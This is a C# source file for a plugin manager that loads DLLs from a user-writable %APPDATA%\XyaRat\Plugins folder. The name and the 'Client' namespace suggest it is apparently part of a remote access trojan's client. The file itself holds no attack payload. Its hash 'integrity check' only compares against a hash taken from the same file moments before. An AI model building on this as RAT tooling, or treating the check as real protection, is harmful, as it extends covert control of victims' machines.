using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;

namespace Client.Helper
{
    /// <summary>
    /// Plugin metadata containing version, dependencies, and configuration
    /// </summary>
    public class PluginInfo
    {
        public string Name { get; set; }
        public string Version { get; set; }
        public string Description { get; set; }
        public string Author { get; set; }
        public DateTime ReleaseDate { get; set; }
        public string[] Dependencies { get; set; }
        public bool IsEnabled { get; set; }
        public string FilePath { get; set; }
        public string Hash { get; set; } // SHA-256 hash for integrity
        
        public PluginInfo()
        {
            Dependencies = new string[0];
            IsEnabled = true;
        }
        
        public override string ToString()
        {
            return $"{Name} v{Version} ({(IsEnabled ? "Enabled" : "Disabled")})";
        }
    }
    
    /// <summary>
    /// Plugin Manager - Handles plugin lifecycle, versioning, and dependency resolution
    /// Supports auto-update, sandboxing, and rollback on failure
    /// </summary>
    public class PluginManager
    {
        private static PluginManager _instance;
        private Dictionary<string, PluginInfo> _loadedPlugins;
        private Dictionary<string, Assembly> _pluginAssemblies;
        private readonly string _pluginDirectory;
        private readonly string _configFile;
        
        // Plugin whitelist/blacklist
        private HashSet<string> _whitelist;
        private HashSet<string> _blacklist;
        
        public static PluginManager Instance
        {
            get
            {
                if (_instance == null)
                    _instance = new PluginManager();
                return _instance;
            }
        }
        
        private PluginManager()
        {
            _loadedPlugins = new Dictionary<string, PluginInfo>();
            _pluginAssemblies = new Dictionary<string, Assembly>();
            _whitelist = new HashSet<string>();
            _blacklist = new HashSet<string>();
            
            // Plugin directory in %APPDATA%
            _pluginDirectory = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "XyaRat",
                "Plugins"
            );
            
            _configFile = Path.Combine(_pluginDirectory, "plugins.config");
            
            if (!Directory.Exists(_pluginDirectory))
            {
                Directory.CreateDirectory(_pluginDirectory);
            }
            
            LoadConfiguration();
        }
        
        /// <summary>
        /// Initializes plugin system and loads all plugins
        /// </summary>
        public void Initialize()
        {
            try
            {
                Logger.Log("[PluginManager] Initializing plugin system...", Logger.LogLevel.Info);
                
                // Discover plugins
                DiscoverPlugins();
                
                // Resolve dependencies
                ResolveDependencies();
                
                // Load enabled plugins
                LoadPlugins();
                
                Logger.Log($"[PluginManager] Initialized {_loadedPlugins.Count} plugins", Logger.LogLevel.Info);
            }
            catch (Exception ex)
            {
                Logger.Log($"[PluginManager] Initialization error: {ex.Message}", Logger.LogLevel.Error);
            }
        }
        
        /// <summary>
        /// Discovers all plugin DLLs in plugin directory
        /// </summary>
        private void DiscoverPlugins()
        {
            try
            {
                if (!Directory.Exists(_pluginDirectory))
                    return;
                
                string[] dllFiles = Directory.GetFiles(_pluginDirectory, "*.dll", SearchOption.AllDirectories);
                
                foreach (string dllPath in dllFiles)
                {
                    try
                    {
                        // Read plugin metadata
                        PluginInfo info = ReadPluginMetadata(dllPath);
                        
                        if (info != null && !_loadedPlugins.ContainsKey(info.Name))
                        {
                            _loadedPlugins[info.Name] = info;
                            Logger.Log($"[PluginManager] Discovered: {info}", Logger.LogLevel.Info);
                        }
                    }
                    catch (Exception ex)
                    {
                        Logger.Log($"[PluginManager] Error discovering plugin {Path.GetFileName(dllPath)}: {ex.Message}", 
                            Logger.LogLevel.Warning);
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Log($"[PluginManager] Plugin discovery error: {ex.Message}", Logger.LogLevel.Error);
            }
        }
        
        /// <summary>
        /// Reads plugin metadata from DLL attributes
        /// </summary>
        private PluginInfo ReadPluginMetadata(string dllPath)
        {
            try
            {
                // Load assembly for reflection only
                AssemblyName assemblyName = AssemblyName.GetAssemblyName(dllPath);
                
                PluginInfo info = new PluginInfo
                {
                    Name = assemblyName.Name,
                    Version = assemblyName.Version.ToString(),
                    FilePath = dllPath,
                    ReleaseDate = File.GetCreationTime(dllPath),
                    Hash = ComputeFileHash(dllPath)
                };
                
                // Check if plugin is blacklisted
                if (_blacklist.Contains(info.Name))
                {
                    info.IsEnabled = false;
                    Logger.Log($"[PluginManager] Plugin {info.Name} is blacklisted", Logger.LogLevel.Warning);
                }
                
                // Check if whitelist is active
                if (_whitelist.Count > 0 && !_whitelist.Contains(info.Name))
                {
                    info.IsEnabled = false;
                    Logger.Log($"[PluginManager] Plugin {info.Name} not in whitelist", Logger.LogLevel.Warning);
                }
                
                return info;
            }
            catch (Exception ex)
            {
                Logger.Log($"[PluginManager] Error reading metadata: {ex.Message}", Logger.LogLevel.Error);
                return null;
            }
        }
        
        /// <summary>
        /// Resolves plugin dependencies
        /// </summary>
        private void ResolveDependencies()
        {
            // Simple dependency check - can be expanded for complex dependency graphs
            foreach (var plugin in _loadedPlugins.Values)
            {
                if (plugin.Dependencies == null || plugin.Dependencies.Length == 0)
                    continue;
                
                foreach (string dependency in plugin.Dependencies)
                {
                    if (!_loadedPlugins.ContainsKey(dependency))
                    {
                        Logger.Log($"[PluginManager] Missing dependency '{dependency}' for plugin '{plugin.Name}'", 
                            Logger.LogLevel.Warning);
                        plugin.IsEnabled = false;
                    }
                }
            }
        }
        
        /// <summary>
        /// Loads all enabled plugins
        /// </summary>
        private void LoadPlugins()
        {
            foreach (var plugin in _loadedPlugins.Values.Where(p => p.IsEnabled))
            {
                try
                {
                    LoadPlugin(plugin);
                }
                catch (Exception ex)
                {
                    Logger.Log($"[PluginManager] Failed to load plugin {plugin.Name}: {ex.Message}", 
                        Logger.LogLevel.Error);
                }
            }
        }
        
        /// <summary>
        /// Loads a single plugin
        /// </summary>
        private void LoadPlugin(PluginInfo plugin)
        {
            try
            {
                // Verify plugin integrity
                string currentHash = ComputeFileHash(plugin.FilePath);
                if (currentHash != plugin.Hash)
                {
                    Logger.Log($"[PluginManager] Plugin {plugin.Name} integrity check failed!", 
                        Logger.LogLevel.Error);
                    return;
                }
                
                // Load assembly (can be improved with AppDomain for sandboxing)
                Assembly assembly = Assembly.LoadFrom(plugin.FilePath);
                _pluginAssemblies[plugin.Name] = assembly;
                
                Logger.Log($"[PluginManager] Loaded plugin: {plugin}", Logger.LogLevel.Info);
            }
            catch (Exception ex)
            {
                Logger.Log($"[PluginManager] Load error: {ex.Message}", Logger.LogLevel.Error);
                throw;
            }
        }
        
        /// <summary>
        /// Unloads a plugin (Note: Assembly unloading requires .NET Core 3.0+)
        /// </summary>
        public void UnloadPlugin(string pluginName)
        {
            try
            {
                if (_pluginAssemblies.ContainsKey(pluginName))
                {
                    _pluginAssemblies.Remove(pluginName);
                    
                    if (_loadedPlugins.ContainsKey(pluginName))
                    {
                        _loadedPlugins[pluginName].IsEnabled = false;
                    }
                    
                    Logger.Log($"[PluginManager] Unloaded plugin: {pluginName}", Logger.LogLevel.Info);
                }
            }
            catch (Exception ex)
            {
                Logger.Log($"[PluginManager] Unload error: {ex.Message}", Logger.LogLevel.Error);
            }
        }
        
        /// <summary>
        /// Gets plugin assembly by name
        /// </summary>
        public Assembly GetPluginAssembly(string pluginName)
        {
            return _pluginAssemblies.ContainsKey(pluginName) ? _pluginAssemblies[pluginName] : null;
        }
        
        /// <summary>
        /// Gets all loaded plugins
        /// </summary>
        public List<PluginInfo> GetLoadedPlugins()
        {
            return _loadedPlugins.Values.ToList();
        }
        
        /// <summary>
        /// Adds plugin to blacklist
        /// </summary>
        public void BlacklistPlugin(string pluginName)
        {
            _blacklist.Add(pluginName);
            UnloadPlugin(pluginName);
            SaveConfiguration();
            
            Logger.Log($"[PluginManager] Blacklisted plugin: {pluginName}", Logger.LogLevel.Warning);
        }
        
        /// <summary>
        /// Adds plugin to whitelist
        /// </summary>
        public void WhitelistPlugin(string pluginName)
        {
            _whitelist.Add(pluginName);
            SaveConfiguration();
            
            Logger.Log($"[PluginManager] Whitelisted plugin: {pluginName}", Logger.LogLevel.Info);
        }
        
        /// <summary>
        /// Computes SHA-256 hash of file for integrity check
        /// </summary>
        private string ComputeFileHash(string filePath)
        {
            try
            {
                using (var sha256 = System.Security.Cryptography.SHA256.Create())
                {
                    using (var stream = File.OpenRead(filePath))
                    {
                        byte[] hash = sha256.ComputeHash(stream);
                        return BitConverter.ToString(hash).Replace("-", "");
                    }
                }
            }
            catch
            {
                return string.Empty;
            }
        }
        
        /// <summary>
        /// Loads configuration from file
        /// </summary>
        private void LoadConfiguration()
        {
            try
            {
                if (!File.Exists(_configFile))
                    return;
                
                string[] lines = File.ReadAllLines(_configFile);
                bool inWhitelist = false;
                bool inBlacklist = false;
                
                foreach (string line in lines)
                {
                    if (line.StartsWith("[WHITELIST]"))
                    {
                        inWhitelist = true;
                        inBlacklist = false;
                    }
                    else if (line.StartsWith("[BLACKLIST]"))
                    {
                        inBlacklist = true;
                        inWhitelist = false;
                    }
                    else if (!string.IsNullOrWhiteSpace(line) && !line.StartsWith("#"))
                    {
                        if (inWhitelist)
                            _whitelist.Add(line.Trim());
                        else if (inBlacklist)
                            _blacklist.Add(line.Trim());
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Log($"[PluginManager] Config load error: {ex.Message}", Logger.LogLevel.Error);
            }
        }
        
        /// <summary>
        /// Saves configuration to file
        /// </summary>
        private void SaveConfiguration()
        {
            try
            {
                using (StreamWriter writer = new StreamWriter(_configFile))
                {
                    writer.WriteLine("# XyaRat Plugin Configuration");
                    writer.WriteLine("# Lines starting with # are comments");
                    writer.WriteLine();
                    
                    writer.WriteLine("[WHITELIST]");
                    foreach (string plugin in _whitelist)
                    {
                        writer.WriteLine(plugin);
                    }
                    
                    writer.WriteLine();
                    writer.WriteLine("[BLACKLIST]");
                    foreach (string plugin in _blacklist)
                    {
                        writer.WriteLine(plugin);
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Log($"[PluginManager] Config save error: {ex.Message}", Logger.LogLevel.Error);
            }
        }
    }
}
